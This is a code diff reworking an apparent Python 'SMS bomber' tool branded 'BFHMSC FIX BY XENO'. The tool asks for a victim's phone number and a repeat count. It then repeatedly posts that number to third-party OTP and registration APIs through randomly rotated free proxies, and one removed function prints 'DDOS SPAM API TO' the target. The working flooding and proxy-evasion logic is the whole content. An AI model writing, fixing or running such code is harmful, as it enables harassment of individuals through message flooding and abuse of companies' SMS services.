@@ -2,23 +2,22 @@ import datetime
 import itertools
 import os
 import random
-import threading
-import time
-from concurrent.futures import ThreadPoolExecutor
-from re import search
-
-import gratient
 import requests
-from httpx import get
-from pystyle import Anime, Center, Colorate, Colors, System, Write
-from requests import Session, get
-from user_agent import generate_user_agent
-os .system ("cls & title BFHMSC FIX BY XENO")
+import threading
+from concurrent.futures import ThreadPoolExecutor
+from rich.console import Console
+from rich.prompt import Prompt
+from rich import print as rprint
+
+# Clear the terminal and set the title
+os.system("cls & title BFHMSC FIX BY XENO")
+
+# Initialize a console for Rich printing
+console = Console()
+
 def now():
-    now = datetime.now()
-    nownow = now.strftime("%H:%M:%S")
-    return nownow
-os .system ("BFHMSC SMS FIX BY Xeno")
+    return datetime.datetime.now().strftime("%H:%M:%S")
+
 banner = r"""
 ██╗  ██╗███████╗███╗   ██╗
 ╚██╗██╔╝██╔════╝████╗  ██║
@@ -30,102 +29,48 @@ banner = r"""
 ║     BFHMSC FIX BY Xeno   ║
 ║     linktr.ee/Xeno_miss  ║
 ╚══════════════════════════╝
-[+] Enter
 """
 
-def rb(text):
-        return (Colorate.Horizontal(Colors.rainbow,text))
+# Print the banner
+console.print(banner)
 
-System.Size(120, 30) 
+# Cycle through colors for console output
+colorsPool = itertools.cycle([i for i in range(256)])
 
-Anime.Fade(Center.Center(banner), Colors.blue_to_cyan, Colorate.Vertical, enter=True)
+def printx(text):
+    color = next(colorsPool)
+    console.print(f'[\x1b[38;5;{color}m{now()}\x1b[0m] {text}')
 
+# ThreadPool for concurrent requests
+thread_pool = ThreadPoolExecutor(max_workers=100)
 
-colorsPool = itertools.cycle([27, 33, 69, 74, 74, 73, 73, 73, 78, 114, 114, 113, 113, 155, 155, 155, 155, 155, 155, 191, 191, 185, 185, 185, 185, 185, 185, 221, 221, 221, 221, 221, 215, 215, 215, 209, 209, 209, 203, 203, 203, 204, 204, 204, 198, 198, 129, 129, 135, 99, 99, 99, 99, 63, 63, 63, 63, 69, 69, 69])
-def printx(input):print('[\x1b[38;5;%sm%s\x1b[0m] %s' % (next(colorsPool), datetime.datetime.now().strftime('%H:%M:%S'), input))
+# Fetch proxies and store them in a list
+proxy_url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
+proxies = requests.get(proxy_url).text.splitlines()
 
-threading = ThreadPoolExecutor(max_workers=int(100000000))
-headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
-header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
-headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
-useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"      
-proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
-f = open("proxy.txt", "w")
-t = f.write(proxy)
-g = open("proxy.txt", "r")
-s = g.read().splitlines()
-
-os .system ("cls & title BFHMSC FIX BY XENO")
-def now():
-    now = datetime.now()
-    nownow = now.strftime("%H:%M:%S")
-    return nownow
-
-
-format_one = 0
-format_two = 0
-format_tre = 0
-
-loop_types = 1
-
-def receive_color():
-    global format_one, format_two, format_tre, loop_types
-
-    for types1, types2, types3, number in zip([1, 0], [0, 1], ['+', '-'], [255, 0]):
-        if (loop_types == types1):
-            if (format_one != number):
-                exec(f'format_one {types3}= 15', globals())
-
-            if (format_one == number) and (format_two != number):
-                exec(f'format_two {types3}= 15', globals())
-
-            if (format_two == number) and (format_tre != number):
-                exec(f'format_tre {types3}= 15', globals())
-
-            if (format_tre == number):
-                loop_types = types2
-
-    return f"\033[38;2;{format_one};{format_two};{format_tre}m"
 def bfhmsc():
-    console.print("""
-    ██╗  ██╗███████╗███╗   ██╗
-    ╚██╗██╔╝██╔════╝████╗  ██║
-     ╚███╔╝ █████╗  ██╔██╗ ██║
-     ██╔██╗ ██╔══╝  ██║╚██╗██║
-    ██╔╝ ██╗███████╗██║ ╚████║
-    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
-    ╔══════════════════════════╗
-    ║     BFHMSC FIX BY Xeno   ║
-    ║     linktr.ee/Xeno_miss  ║
-    ╚══════════════════════════╝
-    """)
-
     phone = Prompt.ask("[+] Phone: ", default="")
 
     # Validate phone number length
     if not (len(phone) == 9):  # Assuming phone number is 9 digits
         console.print('[ERROR] PHONE NUMBER ERROR [ ! ]', style='bold red')
-        time.sleep(1)
-        os.system('clear')
         return
 
     amount = Prompt.ask("\n[+] Time: ", default="")
-
-    # Call the API functions
+    
     try:
         amount = int(amount)
-        for _ in range(amount):  # Assuming you want to call the API 'amount' times
+        for _ in range(amount):
             bfhmscapi(phone)
     except ValueError:
         console.print('[ERROR] Invalid input for time.', style='bold red')
-
 
 def send_request(api_url, phone, data=None, json=None):
     try:
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
         }
-        proxies = {'http': 'http://' + random.choice(s)}
+        proxies = {'http': 'http://' + random.choice(proxies)}
 
         if json:
             r = requests.post(api_url, json=json, headers=headers, proxies=proxies)
@@ -138,8 +83,7 @@ def send_request(api_url, phone, data=None, json=None):
             printx(f"Failed to send to {phone}. Status Code: {r.status_code}")
 
     except Exception as e:
-        printx(f"An error occurred: {str(e)}", style='bold red')
-
+        printx(f"An error occurred: {str(e)}")
 
 def bfhmscapi(phone):
     api_endpoints = [
@@ -162,15 +106,9 @@ def bfhmscapi(phone):
     for api_url, data in api_endpoints:
         send_request(api_url, phone, data=data if isinstance(data, str) else None, json=data if isinstance(data, dict) else None)
 
-
 if __name__ == "__main__":
     bfhmsc()
-def bfhmscapi15(phone):
-	da = datetime.datetime.now()
-	ok = da.strftime("%H:%M:%S")
-	r = requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"},proxies={'http': 'http://' + random.choice(s)})
-	if r.status_code == 200 or r.status_code == 201:
-		printx(f"DDOS SPAM API TO {phone} SUCSESS")
+
 
 def bfhmscapi16(phone):
 	da = datetime.datetime.now()
